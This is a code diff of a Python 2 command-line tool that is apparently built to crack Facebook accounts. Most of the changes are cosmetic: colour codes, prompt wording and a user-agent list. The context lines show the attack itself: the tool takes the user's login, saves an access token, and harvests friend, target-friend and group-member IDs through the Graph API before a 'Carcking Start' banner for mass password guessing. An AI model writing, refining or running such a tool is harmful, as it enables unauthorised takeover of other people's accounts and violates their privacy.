@@ -18,8 +18,7 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3')]
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=2)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) wpif Safari/537.21')]
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/FBIOS;FBAV/66.0.0.42.70;FBBV/40764466;FBRV/0;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]')]
@@ -154,7 +153,7 @@ def login():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print('          [+] LOGIN WITH FACEBOOK [+]')
+        print('\x1b[1;97m          [+] LOGIN WITH FACEBOOK [+]')
         id = raw_input('[+] ID/Email : ')
         pwd = raw_input('[+] Password : ')
         tik()
@@ -210,7 +209,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		print"\033[1;97m[!] \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		keluar()
@@ -221,12 +220,12 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m[!] \033[1;91mToken invalid"
+		print"\033[1;97m[!] \033[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\033[1;96m[!] \x1b[1;91mConnection Error"
+		print"\033[1;97m[!] \x1b[1;91mConnection Error"
 		keluar()
 	os.system("clear")
 	print logo
@@ -271,7 +270,7 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		print"\033[1;97m[!] \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		keluar()
@@ -294,7 +293,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;97m="
-		jalan('\033[1;96m[✺] \033[1;94mGetting IDz \033[1;97m...')
+		jalan('[✺] Getting IDz\033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -303,16 +302,16 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;97m="
-		idt = raw_input("\033[1;96m[+] \033[1;95mEnter Target ID/Email \033[1;91m:\033[1;97m")
+		idt = raw_input("[+] Enter Target ID/Email :")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName Target\033[1;91m :\033[1;91m "+op["name"]
+			print"[✓] Name Target :\033[1;91m "+op["name"]
 		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTarget No Found"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			print"\033[1;97m[!] \x1b[1;91mTarget No Found"
+			raw_input("Back")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mGetting IDz \033[1;97m...')
+		jalan('[✺] Getting IDz\033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -321,16 +320,16 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;97m="
-		idg=raw_input('\033[1;96m[+] \033[1;93mEnter Group ID \033[1;91m:\033[1;97m ')
+		idg=raw_input('[+] Enter Group ID \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
 			asw=json.loads(r.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName Target \033[1;91m:\033[1;97m "+asw['name']
+			print"[✓] Name Target : "+asw['name']
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mGroup No Found"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mGetting IDz \033[1;97m...')
+		jalan('[✺] Getting IDz\033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
 		s=json.loads(re.text)
 		for p in s['data']:
@@ -353,12 +352,12 @@ def pilih_super():
 		print "\033[1;96m[!] \x1b[1;91mSelect Correct"
 		pilih_super()
 	
-	print "\033[1;96m[+] \033[1;96mTotal ID\033[1;91m: \033[1;97m"+str(len(id))
+	print "\x1b[1;97m[+] Total ID\033[1;91m: \033[1;97m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;96mCarcking Start\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\[✸] \033[1;97mCarcking Start\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;96mTo Stop The Process Prexx CTRL+Z 👍')
+	print('\x1b[1;97m[!] \x1b[1;97mTo Stop The Process Prexx CTRL+Z 👍')
 	print 42*"\033[1;97m="
 	
 			
